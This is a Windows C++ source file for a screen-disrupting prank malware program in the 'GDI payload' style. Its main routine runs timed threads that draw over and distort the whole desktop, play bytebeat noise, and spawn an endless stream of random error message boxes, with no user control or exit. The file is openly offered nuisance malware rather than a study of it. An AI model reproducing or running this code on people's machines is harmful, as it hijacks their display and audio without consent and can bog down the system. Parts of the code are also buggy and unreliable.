#pragma once

#include <Windows.h>
#include <cmath>

#pragma  comment(lib,"WinMM.lib")
#pragma  comment(lib,"Msimg32.lib")
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
HCRYPTPROV prov;
DWORD xs;
void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

LPCWSTR GenRandomUnicodeString(int len) {
	wchar_t* strRandom = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		strRandom[i] = (random() % 256) + 1024;
	}

	strRandom[len] = L'\0';

	return strRandom;
}
DWORD WINAPI masher(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(Hue(2));
		SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(2);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI masher2(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(Hue(2));
		SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(0.6);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI textout(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	LPCWSTR lpText = GenRandomUnicodeString(random() % 3 + 3);
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		SetTextColor(hdc, Hue(23));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, top_x, top_y, lpText, wcslen(lpText));
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI masher1(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI train(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI patblt(LPVOID lpParam)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 5, rand() % 5, rand() % 5));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		ReleaseDC(0, hdc);
		DeleteObject(brush);
		Sleep(10);
	}
}
void Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD prgbTemp = { 0 };
	prgbTemp = prgbScreen;
	for (int i = 0; i < h / 2; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * (h / 2) * i - i * i))) % (w * h)].rgb;
		}
	}
	for (int i = h / 2; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = prgbTemp[(int)((float)(i * w + j) + (float)sqrt((2 * (h / 2) * i - i * i))) % (w * h)].rgb;
		}
	}
	Sleep(50);
}
void MessageBoxThread() {
	LPCWSTR strText = GenRandomUnicodeString(random() % 10 + 10);
	LPCWSTR strTitle = GenRandomUnicodeString(random() % 10 + 10);
	if (random() % 2 == 0) {
		MessageBox(NULL, strText, strTitle, MB_ABORTRETRYIGNORE | MB_ICONWARNING);
	}
	else {
		MessageBox(NULL, strText, strTitle, MB_RETRYCANCEL | MB_ICONERROR);
	}
}

void MessageBoxPayload() {
	for (;;) {
		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxThread), NULL, 0, NULL);
		Sleep(1500);
	}
}
void Shader13(int t, int w, int h, PRGBQUAD prgbScreen) {
	PRGBQUAD prgbTemp = { 0 };
	prgbTemp = prgbScreen;
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = prgbTemp[(unsigned int)((float)(j * w + i) + (float)sqrt((2 * h * i - i * i))) % (w * h)].rgb;
		}
	}
	Sleep(100);
}
VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t + (t >> 12 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t + (t >> 12 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(10 * (t >> 6 | t | t >> (t >> 16)) + (7 & t >> 11) + 100 ^ 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(9 | 5 | (3 * t & t >> 10) - 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 3 & t >> 8) * (t >> 7 | t >> 12));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(~(~t & 64 | ~t >> 5) ^ (~t & 33 | ~t >> 8) ^ (~t & 14 | ~t >> 9 | ~t & 76) ^ (~t | 187) ^ t * (~t >> 8 & 838 + ~t >> 13) & 644);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int main()
{
	Sleep(5000);
	HANDLE thread1 = CreateThread(0, 0, masher, 0, 0, 0);
	Sleep(5000);
	HANDLE thread2 = CreateThread(0, 0, textout, 0, 0, 0);
	sound1();
	Sleep(30000);
	TerminateThread(thread2, 0);
	HANDLE thread3 = CreateThread(0, 0, masher1, 0, 0, 0);
	sound2();
	Sleep(30000);
	TerminateThread(thread3, 0);
	HANDLE thread4 = CreateThread(0, 0, train, 0, 0, 0);
	sound3();
	Sleep(31500);
	TerminateThread(thread4, 0);
	HANDLE thread5 = CreateThread(0, 0, patblt, 0, 0, 0);
	HANDLE thread6 = CreateThread(0, 0, masher2, 0, 0, 0);
	HANDLE thread7 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MessageBoxPayload, 0, 0, 0);
	sound4();
	Sleep(31000);
	TerminateThread(thread5, 0);
	TerminateThread(thread6, 0);
	sound5();
	Sleep(30000);
	HANDLE thread9 = CreateThread(0, 0, patblt, 0, 0, 0);
	HANDLE thread10 = CreateThread(0, 0, masher2, 0, 0, 0);
	HANDLE thread11 = CreateThread(0, 0, train, 0, 0, 0);
	HANDLE thread12 = CreateThread(0, 0, masher1, 0, 0, 0);
	sound6();
	Sleep(60000);
}